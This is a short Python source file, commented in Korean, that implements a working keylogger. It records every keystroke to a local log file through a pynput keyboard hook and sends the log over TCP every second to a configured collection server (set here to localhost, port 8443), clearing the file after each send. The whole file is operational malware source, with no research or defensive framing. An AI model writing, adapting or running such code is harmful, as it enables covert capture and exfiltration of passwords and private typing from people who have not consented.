import socket
import time
import os
from pynput import keyboard
import threading
from datetime import datetime

SERVER_IP = "127.0.0.1"
SERVER_PORT = 8443
BUFFER_SIZE = 1024
LOG_FILE = "keylog.txt"

# 키보드 입력을 로그 파일에 기록하는 함수
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(f"Key Pressed: {key.char}\n")
            else:
                log_file.write(f"Special Key Pressed: {key}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# 5초마다 로그 파일에 시간을 기록하는 함수
def periodic_time_update():
    while True:
        time.sleep(5)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n--- Log Update at {current_time} ---\n")

# 서버로 로그 파일을 전송하는 함수
def send_log_to_server():
    while True:
        try:
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((SERVER_IP, SERVER_PORT))
                    print("Connected to server.")
                    
                    with open(LOG_FILE, "rb") as file:
                        while (bytes_read := file.read(BUFFER_SIZE)):
                            sock.sendall(bytes_read)
                    
                    print("Log file sent to server.")
                    
                    # 파일 내용 지우기
                    open(LOG_FILE, "w").close()
        except Exception as e:
            print(f"Error sending data to server: {e}")
        
        # 1초 대기
        time.sleep(1)

# 키보드 후킹 시작
def start_keyboard_hook():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # 키 후킹 스레드 시작
    threading.Thread(target=start_keyboard_hook, daemon=True).start()
    
    # 로그 전송 스레드 시작
    threading.Thread(target=send_log_to_server, daemon=True).start()
    
    # 시간 업데이트 스레드 시작
    threading.Thread(target=periodic_time_update, daemon=True).start()

    # 메인 스레드 유지
    while True:
        time.sleep(1)
